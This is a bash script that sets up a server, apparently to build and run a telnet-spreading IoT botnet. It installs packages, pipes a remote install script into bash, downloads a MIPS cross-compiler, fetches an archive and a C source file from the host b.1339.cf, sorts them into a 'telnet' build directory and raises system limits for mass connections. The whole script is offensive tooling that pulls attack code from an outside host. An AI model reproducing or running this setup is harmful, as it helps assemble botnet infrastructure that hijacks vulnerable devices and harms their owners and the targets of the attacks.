#!/bin/bash

echo "###############################################################################"
echo "# ___     __________  ____ _______      _____ _______________.___.  ___       #"
echo "# / _ \_/\ \______   \/_   |\      \    /  _  \\______   \__  |   | / _ \_/\  #"
echo "# \/ \___/  |    |  _/ |   |/   |   \  /  /_\  \|       _//   |   | \/ \___/  #"
echo "#           |    |   \ |   /    |    \/    |    \    |   \\____   |           #"
echo "#           |______  / |___\____|__  /\____|__  /____|_  // ______|           #"
echo "#                  \/              \/         \/       \/ \/                  #"
echo "###############################################################################"

#########################################
###############UPDATING##################
#########################################

echo "Updating Your Shit"
yum update -y;

#########################################
#############DEPENDENCIES################
#########################################

echo "Setting Up Dependencies For JS P2P Telnet"
yum install curl; yum install screen -y; yum install httpd -y; yum install telnet -y; yum install gcc -y; yum install nano -y; yum install unzip -y; yum install wget; yum install glibc.i686 -y
curl --silent --location https://rpm.nodesource.com/setup | bash -; yum install nodejs -y;

#########################################
###############WGETTING##################
#########################################

echo"Getting Your Net Shit"
mkdir compile;
mkdir telnet;
wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2 && tar -vxjf cross-compiler-mips.tar.bz2;
wget http://b.1339.cf/qbrdwgg.zip;
wget http://b.1339.cf/sygnxbv.c;

#########################################
###############ORGANIZING################
#########################################

cd /root/; mv cross-compiler-mips compile;
cd /root/; mv sygnxbv.c compile;
cd /root/telnet/; mv sygnxbv.c cross-compiler-mips;
cd /root/telnet/cross-compiler-mips; mv sygnxbv.c bin
cd /root/; mv qbrdwgg.zip telnet;
cd /root/telnet/; unzip *zip;
cd /root/telnet/; rm -rf qbrdwgg.zip;
cd /root/; rm -rf cross-compiler-mips.tar.bz2;

#########################################
################ULIMIT###################
#########################################

echo "Fixxing The Ulimit"
ulimit -n 999999; ulimit -u 999999
sysctl -w fs.file-max=100000
echo "Done, Your On Your Own Now"